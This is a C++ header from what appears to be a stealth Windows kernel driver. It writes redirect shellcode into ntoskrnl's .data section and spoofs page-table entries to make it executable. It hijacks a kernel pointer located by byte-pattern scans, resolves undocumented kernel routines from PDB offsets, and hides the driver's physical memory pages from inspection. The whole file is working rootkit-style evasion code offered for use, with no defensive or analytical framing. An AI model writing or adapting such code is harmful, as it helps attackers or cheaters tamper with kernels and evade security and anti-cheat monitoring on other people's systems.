#pragma once
namespace init {

  /**
   * @brief Install function hook by placing shellcode in ntoskrnl .data section
   * @param func Pointer to the hook handler function
   * @return NTSTATUS indicating success or failure
   *
   * Creates and deploys shellcode that redirects execution to the specified
   * handler. Finds unused space in ntoskrnl's .data section, writes shellcode,
   * modifies PTEs for execution permission, and updates the hook address for
   * later restoration.
   */
  auto install_hook(const void* func) -> NTSTATUS {
    globals::hook_pointer = *reinterpret_cast<std::uintptr_t*>(globals::hook_address);

    uint8_t shellcode[globals::SHELL_SIZE] = {
        0x48, 0xB8,              // mov rax, imm64
        0x00, 0x00, 0x00, 0x00,  // placeholder for lower 32 bits of request_handler::handle
        0x00, 0x00, 0x00, 0x00,  // placeholder for upper 32 bits of request_handler::handle
        0x50,                    // push rax
        0xC3                     // ret
    };

    uint32_t section_size = 0;

    // find section base of .data in ntoskrnl
    void* section_base = page_table::find_section_base(reinterpret_cast<void*>(globals::ntos_base),
                                                       &section_size, ".data", 5);
    if (!section_base) {
      log("ERROR", "failed to find section in driver");
      return STATUS_UNSUCCESSFUL;
    }

    // last argument is size of shellcode below
    void* target_address =
        page_table::find_unused_space(section_base, section_size, globals::SHELL_SIZE);
    if (!target_address) {
      log("ERROR", "failed to find unused space in section of driver");
      return STATUS_UNSUCCESSFUL;
    }

    // assign func ptr
    *reinterpret_cast<uintptr_t*>(&shellcode[2]) = reinterpret_cast<uintptr_t>(func);

    globals::memcpy(target_address, shellcode, globals::SHELL_SIZE);

    log("INFO", "shellcode written at addr : 0x%p", target_address);

    // spoof page table entries to make the target address executable
    if (!page_table::spoof_pte_range(reinterpret_cast<uintptr_t>(target_address),
                                     globals::SHELL_SIZE, false)) {
      log("ERROR", "failed to spoof pte range at target address");
      return STATUS_UNSUCCESSFUL;
    }

    // cache for unloading
    *reinterpret_cast<std::uintptr_t*>(globals::hook_address) =
        reinterpret_cast<uintptr_t>(target_address);

    globals::shell_address = target_address;

    log("INFO", "hook installed successfully");

    return STATUS_SUCCESS;
  }

  NTSTATUS initialize_physical_memory_ranges() {
    auto physical_ranges = globals::mm_get_physical_memory_ranges();
    if (!physical_ranges) {
      log("ERROR", "MmGetPhysicalMemoryRanges failed\n");
      return STATUS_UNSUCCESSFUL;
    }

    auto lowest_pfn = MAXULONG_PTR;
    auto highest_pfn = static_cast<ULONG_PTR>(0);

    // iterate through all memory ranges
    for (auto i = 0ul; physical_ranges[i].BaseAddress.QuadPart != 0 ||
                       physical_ranges[i].NumberOfBytes.QuadPart != 0;
         i++) {
      auto base_address = physical_ranges[i].BaseAddress;
      auto number_of_bytes = physical_ranges[i].NumberOfBytes;

      // skip invalid ranges
      if (number_of_bytes.QuadPart == 0) {
        continue;
      }

      // convert physical address to PFN (Page Frame Number)
      auto start_pfn = static_cast<ULONG_PTR>(base_address.QuadPart >> 12);
      auto end_pfn =
          static_cast<ULONG_PTR>((base_address.QuadPart + number_of_bytes.QuadPart - 1) >> 12);

      log("DEBUG", "Memory Range %d: PFN 0x%p - 0x%p (Physical: 0x%llx - 0x%llx)\n", i,
          reinterpret_cast<PVOID>(start_pfn), reinterpret_cast<PVOID>(end_pfn),
          base_address.QuadPart, base_address.QuadPart + number_of_bytes.QuadPart - 1);

      // update lowest PFN
      if (start_pfn < lowest_pfn) {
        lowest_pfn = start_pfn;
      }

      // update highest PFN
      if (end_pfn > highest_pfn) {
        highest_pfn = end_pfn;
      }
    }

    // set the global variables
    globals::mm_lowest_physical_page = lowest_pfn;
    globals::mm_highest_physical_page = highest_pfn;

    log("SUCCESS", "Physical Memory Summary:\n");
    log("INFO", "    Lowest PFN:  0x%p\n",
        reinterpret_cast<PVOID>(globals::mm_lowest_physical_page));
    log("INFO", "    Highest PFN: 0x%p\n",
        reinterpret_cast<PVOID>(globals::mm_highest_physical_page));
    log("INFO", "    Total Pages: 0x%p\n",
        reinterpret_cast<PVOID>(globals::mm_highest_physical_page -
                                globals::mm_lowest_physical_page + 1));

    // free the memory ranges array
    globals::ex_free_pool_with_tag(physical_ranges, 0);

    return STATUS_SUCCESS;
  }

  /**
   * @brief Initialize all global function pointers and offsets from PDB data
   * @param local_offsets Reference to PDB offset structure containing resolved
   * addresses
   * @return NTSTATUS indicating success or failure
   *
   * Master initialization function that sets up all global variables with
   * resolved system function addresses and structure offsets. Includes memory
   * management, process/thread, executive, runtime library, and CRT function
   * assignments. Also performs pattern scanning for hook points and exports
   * resolution.
   */
  auto scan_offsets(pdb_offsets& local_offsets) -> NTSTATUS {
    if (globals::initialized)
      return STATUS_NOT_FOUND;

    globals::dbg_print = reinterpret_cast<function_types::dbg_print_t>(local_offsets.DbgPrint);

    globals::ntos_base = local_offsets.NtoskrnlBase;
    globals::driver_hide_type = local_offsets.DriverHideType;
    globals::dll_hide_type = local_offsets.DllHideType;

    // assign memory management functions
    globals::mm_get_physical_address = reinterpret_cast<function_types::mm_get_physical_address_t>(
        local_offsets.MmGetPhysicalAddress);
    globals::mm_pfn_db = local_offsets.MmPfnDatabase;
    globals::mm_allocate_independent_pages_ex =
        reinterpret_cast<function_types::mm_allocate_independent_pages_ex_t>(
            local_offsets.MmAllocateIndependentPages);
    globals::mm_set_page_protection = reinterpret_cast<function_types::mm_set_page_protection_t>(
        local_offsets.MmSetPageProtection);

    globals::mm_free_independent_pages =
        reinterpret_cast<function_types::mm_free_independent_pages>(
            local_offsets.MmFreeIndependentPages);
    globals::mm_allocate_contiguous_memory =
        reinterpret_cast<function_types::mm_allocate_contiguous_memory_t>(
            local_offsets.MmAllocateContiguousMemory);
    globals::mm_free_contiguous_memory =
        reinterpret_cast<function_types::mm_free_contiguous_memory_t>(
            local_offsets.MmFreeContiguousMemory);
    globals::mm_copy_memory =
        reinterpret_cast<function_types::mm_copy_memory_t>(local_offsets.MmCopyMemory);
    globals::mm_get_virtual_for_physical =
        reinterpret_cast<function_types::mm_get_virtual_for_physical_t>(
            local_offsets.MmGetVirtualForPhysical);
    globals::mm_copy_virtual_memory = reinterpret_cast<function_types::mm_copy_virtual_memory_t>(
        local_offsets.MmCopyVirtualMemory);
    globals::mm_mark_physical_memory_as_bad =
        reinterpret_cast<function_types::mm_mark_physical_memory_as_bad_t>(
            local_offsets.MmMarkPhysicalMemoryAsBad);
    globals::mm_user_probe_address =
        reinterpret_cast<function_types::mm_user_probe_address_t>(local_offsets.MmUserProbeAddress);
    globals::mm_get_system_routine_address =
        reinterpret_cast<function_types::mm_get_system_routine_address_t>(
            local_offsets.MmGetSystemRoutineAddress);
    globals::mm_get_physical_memory_ranges =
        reinterpret_cast<function_types::mm_get_physical_memory_ranges_t>(
            local_offsets.MmGetPhysicalMemoryRanges);
    globals::mm_is_address_valid =
        reinterpret_cast<function_types::mm_is_address_valid_t>(local_offsets.MmIsAddressValid);

    // assign memory info functions
    globals::mi_get_vm_access_logging_partition =
        reinterpret_cast<function_types::mi_get_vm_access_logging_partition_t>(
            local_offsets.MiGetVmAccessLoggingPartition);
    globals::mi_create_decay_pfn =
        reinterpret_cast<function_types::mi_create_decay_pfn_t>(local_offsets.MiCreateDecayPfn);
    globals::mi_get_ultra_page =
        reinterpret_cast<function_types::mi_get_ultra_page_t>(local_offsets.MiGetUltraPage);
    globals::mi_reserve_ptes =
        reinterpret_cast<function_types::mi_reserve_ptes_t>(local_offsets.MiReservePtes);
    globals::mi_get_pte_address =
        reinterpret_cast<function_types::mi_get_pte_address_t>(local_offsets.MiGetPteAddress);
    globals::mi_get_pde_address =
        reinterpret_cast<function_types::mi_get_pde_address_t>(local_offsets.MiGetPdeAddress);
    globals::mi_remove_physical_memory =
        reinterpret_cast<function_types::mi_remove_physical_memory_t>(
            local_offsets.MiRemovePhysicalMemory);
    globals::mi_flush_entire_tb_due_to_attribute_change =
        reinterpret_cast<function_types::mi_flush_entire_tb_due_to_attribute_change_t>(
            local_offsets.MiFlushEntireTbDueToAttributeChange);
    globals::mi_flush_cache_range =
        reinterpret_cast<function_types::mi_flush_cache_range_t>(local_offsets.MiFlushCacheRange);
    globals::mi_get_page_table_pfn_buddy_raw =
        reinterpret_cast<function_types::mi_get_page_table_pfn_buddy_raw_t>(
            local_offsets.MiGetPageTablePfnBuddyRaw);
    globals::mi_set_page_table_pfn_buddy =
        reinterpret_cast<function_types::mi_set_page_table_pfn_buddy_t>(
            local_offsets.MiSetPageTablePfnBuddy);

    // assign proc/obj functions
    globals::ps_loaded_module_list = local_offsets.PsLoadedModuleList;
    globals::ps_acquire_process_exit_synchronization =
        reinterpret_cast<function_types::ps_acquire_process_exit_synchronization_t>(
            local_offsets.PsAcquireProcessExitSynchronization);
    globals::ps_release_process_exit_synchronization =
        reinterpret_cast<function_types::ps_release_process_exit_synchronization_t>(
            local_offsets.PsReleaseProcessExitSynchronization);
    globals::ps_get_process_exit_status =
        reinterpret_cast<function_types::ps_get_process_exit_status_t>(
            local_offsets.PsGetProcessExitStatus);
    globals::ps_set_create_process_notify_routine_ex =
        reinterpret_cast<function_types::ps_set_create_process_notify_routine_ex_t>(
            local_offsets.PsSetCreateProcessNotifyRoutineEx);
    globals::ps_set_create_thread_notify_routine =
        reinterpret_cast<function_types::ps_set_create_thread_notify_routine_t>(
            local_offsets.PsSetCreateThreadNotifyRoutine);
    globals::ps_set_create_process_notify_routine_ex =
        reinterpret_cast<function_types::ps_set_create_process_notify_routine_ex_t>(
            local_offsets.PsSetCreateProcessNotifyRoutineEx);
    globals::ps_lookup_process_by_process_id =
        reinterpret_cast<function_types::ps_lookup_process_by_process_id_t>(
            local_offsets.PsLookupProcessByProcessId);
    globals::ps_lookup_thread_by_thread_id =
        reinterpret_cast<function_types::ps_lookup_thread_by_thread_id_t>(
            local_offsets.PsLookupThreadByThreadId);
    globals::ps_get_next_process_thread =
        reinterpret_cast<function_types::ps_get_next_process_thread_t>(
            local_offsets.PsGetNextProcessThread);
    globals::ps_suspend_thread =
        reinterpret_cast<function_types::ps_suspend_thread_t>(local_offsets.PsSuspendThread);
    globals::ps_resume_thread =
        reinterpret_cast<function_types::ps_suspend_thread_t>(local_offsets.PsResumeThread);
    globals::ps_query_thread_start_address =
        reinterpret_cast<function_types::ps_query_thread_start_address_t>(
            local_offsets.PsQueryThreadStartAddress);
    globals::ps_get_current_thread_id =
        reinterpret_cast<function_types::ps_get_current_thread_id_t>(
            local_offsets.PsGetCurrentThreadId);
    globals::ps_get_process_peb =
        reinterpret_cast<function_types::ps_get_process_peb_t>(local_offsets.PsGetProcessPeb);
    globals::ps_get_process_image_file_name =
        reinterpret_cast<function_types::ps_get_process_image_file_name_t>(
            local_offsets.PsGetProcessImageFileName);
    globals::io_get_current_process = reinterpret_cast<function_types::io_get_current_process_t>(
        local_offsets.IoGetCurrentProcess);
    globals::obf_dereference_object = reinterpret_cast<function_types::obf_dereference_object_t>(
        local_offsets.ObfDereferenceObject);

    // processor support functions
    globals::psp_exit_thread = local_offsets.PspExitThread;

    // assign executive functions
    globals::ex_allocate_pool2 =
        reinterpret_cast<function_types::ex_allocate_pool2_t>(local_offsets.ExAllocatePool2);
    globals::ex_free_pool_with_tag =
        reinterpret_cast<function_types::ex_free_pool_with_tag_t>(local_offsets.ExFreePoolWithTag);
    globals::ex_get_previous_mode =
        reinterpret_cast<function_types::ex_get_previous_mode_t>(local_offsets.ExGetPreviousMode);

    globals::ke_balance_set_manager = local_offsets.KeBalanceSetManager;
    globals::ke_raise_irql_to_dpc_level =
        reinterpret_cast<function_types::ke_raise_irql_to_dpc_level_t>(
            local_offsets.KeRaiseIrqlToDpcLevel);
    globals::ke_lower_irql =
        reinterpret_cast<function_types::ke_lower_irql_t>(local_offsets.KeLowerIrql);
    globals::ki_process_list_head = reinterpret_cast<PLIST_ENTRY>(local_offsets.KiProcessListHead);
    globals::ki_page_fault = local_offsets.KiPageFault;
    globals::ke_flush_single_tb =
        reinterpret_cast<ke_flush_single_tb_t>(local_offsets.KeFlushSingleTb);

    // assign runtime library functions
    globals::rtl_init_ansi_string =
        reinterpret_cast<function_types::rtl_init_ansi_string_t>(local_offsets.RtlInitAnsiString);
    globals::rtl_init_unicode_string = reinterpret_cast<function_types::rtl_init_unicode_string_t>(
        local_offsets.RtlInitUnicodeString);
    globals::rtl_ansi_string_to_unicode_string =
        reinterpret_cast<function_types::rtl_ansi_string_to_unicode_string_t>(
            local_offsets.RtlAnsiStringToUnicodeString);
    globals::rtl_compare_unicode_string =
        reinterpret_cast<function_types::rtl_compare_unicode_string_t>(
            local_offsets.RtlCompareUnicodeString);
    globals::rtl_free_unicode_string = reinterpret_cast<function_types::rtl_free_unicode_string_t>(
        local_offsets.RtlFreeUnicodeString);
    globals::rtl_get_version =
        reinterpret_cast<function_types::rtl_get_version_t>(local_offsets.RtlGetVersion);
    globals::rtl_create_user_thread = reinterpret_cast<function_types::rtl_create_user_thread_t>(
        local_offsets.RtlCreateUserThread);

    // zw/nt functions
    globals::zw_open_process =
        reinterpret_cast<function_types::zw_open_process_t>(local_offsets.ZwOpenProcess);
    globals::zw_close = reinterpret_cast<function_types::zw_close_t>(local_offsets.ZwClose);
    globals::zw_wait_for_single_object =
        reinterpret_cast<function_types::zw_wait_for_single_object_t>(
            local_offsets.ZwWaitForSingleObject);

    // assign crt functions
    globals::memcpy = reinterpret_cast<function_types::memcpy_t>(local_offsets.memcpy);
    globals::memset = reinterpret_cast<function_types::memset_t>(local_offsets.memset);
    globals::memcmp = reinterpret_cast<function_types::memcmp_t>(local_offsets.memcmp);
    globals::strncmp = reinterpret_cast<function_types::strncmp_t>(local_offsets.strncmp);
    globals::strlen = reinterpret_cast<function_types::strlen_t>(local_offsets.strlen);
    globals::_wcsicmp = reinterpret_cast<function_types::_wcsicmp_t>(local_offsets._wcsicmp);
    globals::rand = reinterpret_cast<function_types::rand_t>(local_offsets.rand);
    globals::srand = reinterpret_cast<function_types::srand_t>(local_offsets.srand);

    // assign struct offsets
    globals::active_process_links = local_offsets.ActiveProcessLinks;
    globals::_eprocess_thread_list_head = local_offsets._EPROCESS_ThreadListHead;
    globals::_kprocess_thread_list_head = local_offsets._KPROCESS_ThreadListHead;
    globals::_eprocess_shared_commit_links = local_offsets._EPROCESS_SharedCommitLinks;
    globals::_eprocess_shared_commit_charge = local_offsets._EPROCESS_SharedCommitCharge;
    globals::_eprocess_rundown_protect = local_offsets._EPROCESS_RundownProtect;
    globals::_eprocess_vm = local_offsets._EPROCESS_Vm;
    globals::_eprocess_flags3 = local_offsets._EPROCESS_Flags3;

    globals::hook_address =
        scan(globals::ntos_base, ("48 8B 05 ? ? ? ? 75 07 48 8B 05 ? ? ? ? E8 ? ? ? ?"))
            .resolve_lea();

    if (!globals::hook_address) {
      log("ERROR", "hook pattern not found in ntoskrnl 1");
      globals::hook_address =
          scan(globals::ntos_base,
               ("48 89 05 ? ? ? ? 48 8D 05 ? ? ? ? 48 89 05 ? ? ? ? 48 8D 05 ? ? "
                "? ? 48 89 05 ? ? ? ? E8 ? ? ? ? E8 ? ? ? ? E8 ? ? ? ? C6 05 ? ? "
                "? ? ? E8 ? ? ? ? 48 63 D8"))
              .resolve_lea();
      if (!globals::hook_address) {
        log("ERROR", "hook pattern not found in ntoskrnl 2");
        globals::hook_address =
            scan(globals::ntos_base, ("48 8B 05 ? ? ? ? 74 49 E8 ? ? ? ? 8B C8")).resolve_mov();
        if (!globals::hook_address) {
          log("ERROR", "hook pattern not found in ntoskrnl 3");
          return STATUS_NOT_FOUND;
        }
      }
    }

    globals::build_version = utils::get_windows_version();

    // Use our resolved functions instead of imports
    UNICODE_STRING routine_name;
    globals::rtl_init_unicode_string(&routine_name, L"KeFlushEntireTb");
    globals::ke_flush_entire_tb =
        (function_types::ke_flush_entire_tb_t)globals::mm_get_system_routine_address(&routine_name);
    if (!globals::ke_flush_entire_tb) {
      log("ERROR", "failed to find export KeFlushEntireTb");
      return STATUS_NOT_FOUND;
    }

    globals::rtl_init_unicode_string(&routine_name, L"KeInvalidateAllCaches");
    globals::ke_invalidate_all_caches =
        (function_types::ke_invalidate_all_caches_t)globals::mm_get_system_routine_address(
            &routine_name);
    if (!globals::ke_invalidate_all_caches) {
      log("ERROR", "failed to find export KeInvalidateAllCaches");
      return STATUS_NOT_FOUND;
    }

    if (!globals::initialized) {
      globals::initialized = true;

      NTSTATUS initialize_physical_memory_ranges_status = initialize_physical_memory_ranges();
      if (!NT_SUCCESS(initialize_physical_memory_ranges_status)) {
        return STATUS_INSUFFICIENT_RESOURCES;
      }

      NTSTATUS physical_init_status = physical::init();
      if (!NT_SUCCESS(physical_init_status)) {
        return STATUS_INSUFFICIENT_RESOURCES;
      }
    }

    return STATUS_SUCCESS;
  }

  /**
   * @brief Apply stealth hiding techniques to driver memory pages
   * @param address Base virtual address of driver memory
   * @param size Size of driver memory region in bytes
   * @return NTSTATUS indicating success or failure
   *
   * Walks through all driver pages and applies hiding techniques to their
   * corresponding page table entries (PML4E, PDPTE, PDE, PTE). Uses top-down
   * approach to avoid race conditions and tracks indices to prevent duplicate
   * hiding operations on shared page table structures.
   */
  auto hide_driver_pages(const uintptr_t address, const uintptr_t size) -> NTSTATUS {
    log("INFO", "starting to hide pages at address 0x%llx with size 0x%llx", address, size);

    const auto cr3 = [&] {
      CR3 temp{};
      temp.Flags = __readcr3();
      return temp;
    }();

    LARGE_INTEGER number_of_bytes;
    number_of_bytes.QuadPart = PAGE_SIZE;

    LARGE_INTEGER number_of_bytes_large;
    number_of_bytes_large.QuadPart = 0x200000;

    uint64_t last_pml4e_index = ~0ull;
    uint64_t last_pdpte_index = ~0ull;
    uint64_t last_pde_index = ~0ull;

    for (uintptr_t current_addr = address; current_addr < address + size;
         current_addr += PAGE_SIZE) {
      // calculate current indices
      const uint64_t pml4e_index = (current_addr >> 39) & 0x1FF;
      const uint64_t pdpte_index = (current_addr >> 30) & 0x1FF;
      const uint64_t pde_index = (current_addr >> 21) & 0x1FF;

      const auto page_info =
          page_table::get_page_information(reinterpret_cast<void*>(current_addr), cr3);
      if (!page_info.PDE) {
        continue;
      }

      // top down to avoid race conditions: PML4E -> PDPTE -> PDE -> PTE
      if (page_info.PML4E && pml4e_index != last_pml4e_index) {
        PHYSICAL_ADDRESS pml4e_physical;
        pml4e_physical.QuadPart = static_cast<LONGLONG>(page_info.PML4E->PageFrameNumber)
                                  << PAGE_SHIFT;
        if (pml4e_physical.QuadPart) {
          mem::hide_physical_memory(page_info.PML4E->PageFrameNumber,
                                    static_cast<hide_type>(globals::driver_hide_type));
          log("INFO",
              "hidden physical memory for PML4E at address 0x%llx, physical "
              "address 0x%llx",
              current_addr, pml4e_physical.QuadPart);
          last_pml4e_index = pml4e_index;
        }
      }

      if (page_info.PDPTE && (pml4e_index != last_pml4e_index || pdpte_index != last_pdpte_index)) {
        PHYSICAL_ADDRESS pdpte_physical;
        pdpte_physical.QuadPart = static_cast<LONGLONG>(page_info.PDPTE->PageFrameNumber)
                                  << PAGE_SHIFT;
        if (pdpte_physical.QuadPart) {
          mem::hide_physical_memory(page_info.PDPTE->PageFrameNumber,
                                    static_cast<hide_type>(globals::driver_hide_type));
          log("INFO",
              "hidden physical memory for PDPTE at address 0x%llx, physical "
              "address 0x%llx",
              current_addr, pdpte_physical.QuadPart);
          last_pdpte_index = pdpte_index;
        }
      }

      if (page_info.PDE && (pml4e_index != last_pml4e_index || pdpte_index != last_pdpte_index ||
                            pde_index != last_pde_index)) {
        PHYSICAL_ADDRESS pde_physical;
        pde_physical.QuadPart = static_cast<LONGLONG>(page_info.PDE->PageFrameNumber) << PAGE_SHIFT;
        if (pde_physical.QuadPart) {
          mem::hide_physical_memory(page_info.PDE->PageFrameNumber,
                                    static_cast<hide_type>(globals::driver_hide_type));
          log("INFO",
              "hidden physical memory for PDE at address 0x%llx, physical "
              "address 0x%llx",
              current_addr, pde_physical.QuadPart);
          last_pde_index = pde_index;
        }
      }

      if (page_info.PTE) {
        PHYSICAL_ADDRESS pte_physical;
        pte_physical.QuadPart = static_cast<LONGLONG>(page_info.PTE->PageFrameNumber) << PAGE_SHIFT;
        if (pte_physical.QuadPart) {
          mem::hide_physical_memory(page_info.PTE->PageFrameNumber,
                                    static_cast<hide_type>(globals::driver_hide_type));
          log("INFO",
              "hidden physical memory for PTE at address 0x%llx, physical "
              "address 0x%llx",
              current_addr, pte_physical.QuadPart);
        }
      }
    }

    log("INFO", "completed marking pages from 0x%llx to 0x%llx", address, address + size);
    return STATUS_SUCCESS;
  }

}  // namespace init
